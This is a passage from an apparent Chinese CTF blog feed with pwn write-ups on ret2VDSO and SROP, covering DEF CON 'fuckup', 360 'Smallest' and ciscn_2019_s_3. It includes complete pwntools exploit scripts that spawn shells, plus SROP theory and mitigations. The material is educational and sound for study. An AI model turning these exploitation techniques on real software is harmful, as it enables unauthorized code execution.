str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p><pre><code class="bash">$ checksec ./fuckup[*] &#39;/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p><pre><code class="bash">$ ./fuckupWelcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.This app is to help prove the benefits of F.U.C.K.U.P.Main Menu---------1. Display info2. Change random3. View state info4. Test stack smash-------0. Quit</code></pre><p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p><pre><code class="cpp">int sub_80481A6(){  ...  do  {    seed_1 = WELL512() * 4294967295.0;    seed_2 = (signed __int64)seed_1;    addy = (void *)(seed_2 &amp; 0xFFFFF000);    actual = my_mmap(seed_2 &amp; 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0);  }  while ( (seed_2 &amp; 0xFFFFF000) != actual );  qmemcpy(addy, dword_804EB40, 0x7000u);  my_mprotect(addy, 0x4000u, 5);  ...}</code></pre><p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p><ul><li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li><li>直接溢出改返回地址，但只有 100 个字节<ul><li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li><li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li><li>使用 sysenter 将栈转移到 TLS 段</li><li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li></ul></li><li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li><li>循环直到成功 get shell</li></ul><p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from z3 import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;state = [BitVec(&quot;a1_{0}&quot;.format(i), 32) for i in range(16)]def m(x):    return p32(x + offset)def well512(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ ((a &lt;&lt; 16) &amp; 0xffffffff) ^ ((c &lt;&lt; 15) &amp; 0xffffffff)    c = state[(index+9) &amp; 15]    c ^= (c &gt;&gt; 11)    state[(index+10) &amp; 15] = c ^ b    a = state[idx]    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; 2) &amp; 0xffffffff) ^ (        (b &lt;&lt; 18) &amp; 0xffffffff) ^ ((c &lt;&lt; 28) &amp; 0xffffffff)    return idxdef well512_z3(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ (a &lt;&lt; 16) ^ (c &lt;&lt; 15)    c = state[(index+9) &amp; 15]    c ^= LShR(c, 11)    a = state[idx]    state[(index+10) &amp; 15] = b ^ c    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    a = state[idx]    state[idx] = a ^ b ^ d ^ (a &lt;&lt; 2) ^ (b &lt;&lt; 18) ^ (c &lt;&lt; 28)    return idxdef find_state(recv):    info(&#39;Start find state.&#39;)    global state    z = Solver()    idx = 15    for r in recv:        idx = well512_z3(idx)        z.add(state[idx] == r + 1)    return zp = process(&#39;./fuckup&#39;)def choice(c):    p.recvuntil(&#39;Quit\n&#39;)    p.sendline(str(c))r_list = []for i in range(15):    choice(3)    sleep(0.1)    r = int(p.recv(0x20)[0x11:0x19], 16)    r_list.append(r)info(r_list)z = find_state(r_list)info(&#39;Solver result =&gt; &#39; + str(z.check()))next_state = dict()model = z.model()for i in model:    idx = int(str(i)[3:])    val = model[i].as_long()    next_state[idx] = valinfo(next_state)for i in range(16):    if i in next_state:        state[i] = next_state[i]idx = 15for i in range(15):    idx = well512(idx)idx = well512(idx)predict_val = state[idx] - 1info(&#39;predict_val = &#39; + hex(predict_val))current_base = 0xfffff000 &amp; predict_valinfo(&#39;current_base = &#39; + hex(current_base))base = 0x8048000offset = current_base - base# 0x0804908f : pop eax ; pop ebx ; pop esi ; retpop_eax_ebx_esi_ret = 0x0804908f# 0x0804961a : pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx_ret = 0x0804961a# 0x0804875f : int 0x80int_0x80 = 0x0804875fpayload = &#39;A&#39; * 0x16payload += m(pop_eax_ebx_esi_ret)payload += p32(0x7D)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x7)payload += p32(0x1000)payload += p32(current_base)payload += m(int_0x80)payload += m(pop_eax_ebx_esi_ret)payload += p32(0x3)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x100)payload += p32(current_base)payload += p32(0)payload += m(int_0x80)payload += p32(current_base)payload = payload.ljust(100, &#39;A&#39;)payload += asm(shellcraft.sh())p.sendline(&#39;4&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Understanding SigReturn-Oriented-Programming</title>
    <link href="/2020/03/13/Understanding-SigReturn-Oriented-Programming/"/>
    <url>/2020/03/13/Understanding-SigReturn-Oriented-Programming/</url>
    
    <content type="html"><![CDATA[<p>去年学 ROP 的时候遗漏的一个技术。</p><a id="more"></a><h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p><p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" srcset="/img/loading.gif" alt></p><ol><li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li><li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li><li>接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；</li><li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li></ol><p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" srcset="/img/loading.gif" alt></p><p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u16                gs, __gsh;    __u16                fs, __fsh;    __u16                es, __esh;    __u16                ds, __dsh;    __u32                edi;    __u32                esi;    __u32                ebp;    __u32                esp;    __u32                ebx;    __u32                edx;    __u32                ecx;    __u32                eax;    __u32                trapno;    __u32                err;    __u32                eip;    __u16                cs, __csh;    __u32                eflags;    __u32                esp_at_signal;    __u16                ss, __ssh;    struct _fpstate __user        *fpstate; // FPU寄存器状态    __u32                oldmask;    __u32                cr2;};</code></pre><p>在 x64 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u64                r8;    __u64                r9;    __u64                r10;    __u64                r11;    __u64                r12;    __u64                r13;    __u64                r14;    __u64                r15;    __u64                rdi;    __u64                rsi;    __u64                rbp;    __u64                rbx;    __u64                rdx;    __u64                rax;    __u64                rcx;    __u64                rsp;    __u64                rip;    __u64                eflags;        /* RFLAGS */    __u16                cs;    __u16                gs;    __u16                fs;    __u16                __pad0;    __u64                err;    __u64                trapno;    __u64                oldmask;    __u64                cr2;    struct _fpstate __user        *fpstate;    /* Zero when no FPU context */    __u64                reserved1[8];};</code></pre><h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p><ul><li>Signal Frame 可以被用户读写；</li><li>因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。</li></ul><p>那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：</p><ul><li>可以通过栈溢出来控制栈</li><li>需要知道一些地址<ul><li><code>&amp;&quot;/bin/sh&quot;</code></li><li>Signal Frame</li><li>Gadget：<code>syscall ; ret</code></li><li>Sigreturn</li></ul></li><li>需要有足够大的空间来放下 Signal Frame</li></ul><p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p><pre><code class="cpp">char buf[0x200];int main(){    asm(        // 读取 0x200 字节        &quot;mov rax, 0\n&quot; // sys_read        &quot;mov rdi, 0\n&quot; // fd        &quot;lea rsi, %0\n&quot; // buf        &quot;mov rdx, 0x200\n&quot; // count        &quot;syscall\n&quot;        // 恢复进程上下文        &quot;mov rax, 15\n&quot; // sys_rt_sigaction        &quot;mov rdi, 0\n&quot;        &quot;mov rsp, rsi\n&quot; // 把buf作为栈        // syscall 的 symbol，便于查找        &quot;syscall:\n&quot;        &quot;syscall\n&quot;        &quot;jmp exit\n&quot;        // 退出程序        &quot;exit:\n&quot;        &quot;mov rax, 60\n&quot; // sys_exit        &quot;mov rdi, 0\n&quot;        &quot;syscall\n&quot;        :        : &quot;m&quot; (buf)        :        );}</code></pre><p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;p = process(&#39;./main&#39;)elf = ELF(&#39;./main&#39;)#gdb.attach(p)# 构造假的Signal Frameframe = SigreturnFrame()frame.rax = constants.SYS_execve # 设置系统调用号为sys_execveframe.rdi = elf.symbols[&#39;buf&#39;] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串frame.rsi = 0frame.rdx = 0frame.rip = elf.symbols[&#39;syscall&#39;]payload = str(frame).ljust(0x100, &#39;A&#39;) + &#39;/bin/sh\x00&#39; # 设置payloadp.send(payload)p.interactive()</code></pre><p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p><pre><code class="gdb">──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────rt_sigreturn()───────────────────────────────── SROP info ──────────────────────────────────       ss_size:0x0000000000000000           rsi:0x0000000000000000           rax:0x000000000000003b           rbp:0x0000000000000000        eflags:0x0000000000000000           rcx:0x0000000000000000           rip:0x000000000040011b           r13:0x0000000000000000           cr2:0x0000000000000000           r12:0x0000000000000000           rbx:0x0000000000000000       uc_link:0x0000000000000000           err:0x0000000000000000        trapno:0x0000000000000000           r10:0x0000000000000000      ss_flags:0x0000000000000000         ss_sp:0x0000000000000000           rdi:0x0000000000600280      uc_flags:0x0000000000000000           r14:0x0000000000000000            r8:0x0000000000000000      selector:0x0000000000000033            r9:0x0000000000000000           rdx:0x0000000000000000           rsp:0x0000000000000000       oldmask:0x0000000000000000           r11:0x0000000000000000           r15:0x0000000000000000...──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)const char *name : 0x600280 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)const char *const *argv : 0x0const char *const *envp : 0x0</code></pre><h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p><pre><code class="bash">$ checksec ./smallest[*] &#39;/home/beale/SROP/2017-360Chunqiu-Smallest/smallest&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p><pre><code class="bash">$ objdump -d ./smallest -M intel./smallest:     file format elf64-x86-64Disassembly of section .text:00000000004000b0 &lt;.text&gt;:  4000b0:    48 31 c0                 xor    rax,rax  4000b3:    ba 00 04 00 00           mov    edx,0x400  4000b8:    48 89 e6                 mov    rsi,rsp  4000bb:    48 89 c7                 mov    rdi,rax  4000be:    0f 05                    syscall  4000c0:    c3                       ret</code></pre><p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./smallest&#39;)elf = ELF(&#39;./smallest&#39;)#gdb.attach(p)main_addr = 0x4000b0syscall_addr = 0x4000bepayload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入raw_input(&#39;@main*3&#39;)p.send(payload)payload = &#39;\xb3&#39; # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址raw_input(&#39;@leak stack&#39;)p.send(payload)p.recv(8)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_read # sys_read的调用号frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscall_addrpayload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上raw_input(&#39;@fake sigcontext to pivot stack&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)# 下面开始往新的栈上写东西bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_execve # sys_execve的调用号frame.rdi = bin_sh_addrframe.rip = syscall_addrpayload += str(frame) + &#39;/bin/sh\x00&#39; # 开shellraw_input(&#39;@fake sigcontext to exec shell&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)p.interactive()</code></pre><p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p><pre><code class="python">payload = p64(main_addr) + p64(syscall_addr)frame = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = stack_addr &amp; 0xfffffffffffff000frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108 # 设置栈的位置frame.rip = syscall_addrpayload += str(frame)payload += p64(stack_addr + 0x110) # 设置return的地址payload += asm(shellcraft.sh())p.send(payload)</code></pre><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p><pre><code class="bash">$ checksec ./ciscn_s_3[*] &#39;/root/tmp/ciscn_2019_s_3/ciscn_s_3&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p><pre><code class="asm">000000000040051d &lt;main&gt;:  40051d:    55                       push   rbp  40051e:    48 89 e5                 mov    rbp,rsp  400521:    48 83 ec 10              sub    rsp,0x10  400525:    89 7d fc                 mov    DWORD PTR [rbp-0x4],edi  400528:    48 89 75 f0              mov    QWORD PTR [rbp-0x10],rsi  40052c:    b8 00 00 00 00           mov    eax,0x0  400531:    e8 b7 ff ff ff           call   4004ed &lt;vuln&gt;  400536:    90                       nop  400537:    c9                       leave  400538:    c3                       ret</code></pre><p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p><pre><code class="asm">00000000004004ed &lt;vuln&gt;:  4004ed:    55                       push   rbp  4004ee:    48 89 e5                 mov    rbp,rsp  4004f1:    48 31 c0                 xor    rax,rax  4004f4:    ba 00 04 00 00           mov    edx,0x400  4004f9:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  4004fe:    48 89 c7                 mov    rdi,rax  400501:    0f 05                    syscall  400503:    48 c7 c0 01 00 00 00     mov    rax,0x1  40050a:    ba 30 00 00 00           mov    edx,0x30  40050f:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  400514:    48 89 c7                 mov    rdi,rax  400517:    0f 05                    syscall  400519:    c3                       ret  40051a:    90                       nop  40051b:    5d                       pop    rbp  40051c:    c3                       ret</code></pre><p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p><pre><code class="asm">00000000004004d6 &lt;gadgets&gt;:  4004d6:    55                       push   rbp  4004d7:    48 89 e5                 mov    rbp,rsp  4004da:    48 c7 c0 0f 00 00 00     mov    rax,0xf  4004e1:    c3                       ret  4004e2:    48 c7 c0 3b 00 00 00     mov    rax,0x3b  4004e9:    c3                       ret  4004ea:    90                       nop  4004eb:    5d                       pop    rbp  4004ec:    c3                       ret</code></pre><p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]local = 0if local:  p = process(&#39;./ciscn_s_3&#39;)else:    p = remote(&#39;node3.buuoj.cn&#39;, 28526)#gdb.attach(p)vuln_addr = 0x4004f1set_sigreturn_addr = 0x4004daset_execve_addr = 0x4004e2syscall_ret = 0x400517payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;A&#39;) + p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)p.recv(32)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))bin_sh_addr = stack_addr - 0x118payload = p64(set_sigreturn_addr) + p64(syscall_ret)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload += str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p><h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。</p><h2 id="Break-kernel-agnostic"><a href="#Break-kernel-agnostic" class="headerlink" title="Break kernel agnostic"></a>Break kernel agnostic</h2><p>这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 <code>sigreturn</code> 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop</a><br><a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.h</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="http://blog.leanote.com/post/3191220142@qq.com/SROP" target="_blank" rel="noopener">http://blog.leanote.com/post/3191220142@qq.com/SROP</a><br><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/87447.html</a><br><a href="http://blog.eonew.cn/archives/975" target="_blank" rel="noopener">http://blog.eonew.cn/archives/975</a><br><a href="https://bestwing.me/2017-360chunqiu-online.html" target="_blank" rel="noopener">https://bestwing.me/2017-360chunqiu-online.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下的各类程序保护机制</title>
    <link href="/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2020/03/06/Linux%E4%B8%8B%E7%9A%84%E5%90%84%E7%B1%BB%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p>之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Linux 版本：</p><pre><code class="bash">$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>GCC 版本：</p><pre><code class="bash">$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions.  There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</code></pre><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">Checksec</a> 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。</p><p><img src="/pics/Linux下的各类程序保护机制/1.png" srcset="/img/loading.gif" alt></p><h1 id="Cannary"><a href="#Cannary" class="headerlink" title="Cannary"></a>Cannary</h1><p>Canary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。</p><p>gcc 在 4.2 版本中添加了 <code>-fstack-protector</code> 和 <code>-fstack-protector-all</code> 编译参数以支持栈保护功能，4.9 新增了 <code>-fstack-protector-strong</code> 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。</p><p>测试代码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;int main() {    char buf[20];    gets(buf);    return 0;}</code></pre><h2 id="Default（-fstack-protector）"><a href="#Default（-fstack-protector）" class="headerlink" title="Default（-fstack-protector）"></a>Default（<code>-fstack-protector</code>）</h2><p>默认情况下，开启了 Cannary 保护（即 <code>-fstack-protector</code> 参数），一开始会在栈上存储 Cannary（<code>QWORD PTR fs:0x28</code>），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 <code>__stack_chk_fail()</code> 产生报错：</p><pre><code class="asm">0000000000400596 &lt;main&gt;:  400596:    55                       push   rbp  400597:    48 89 e5                 mov    rbp,rsp  40059a:    48 83 ec 20              sub    rsp,0x20  40059e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28  4005a5:    00 00  4005a7:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax  4005ab:    31 c0                    xor    eax,eax  4005ad:    48 8d 45 e0              lea    rax,[rbp-0x20]  4005b1:    48 89 c7                 mov    rdi,rax  4005b4:    b8 00 00 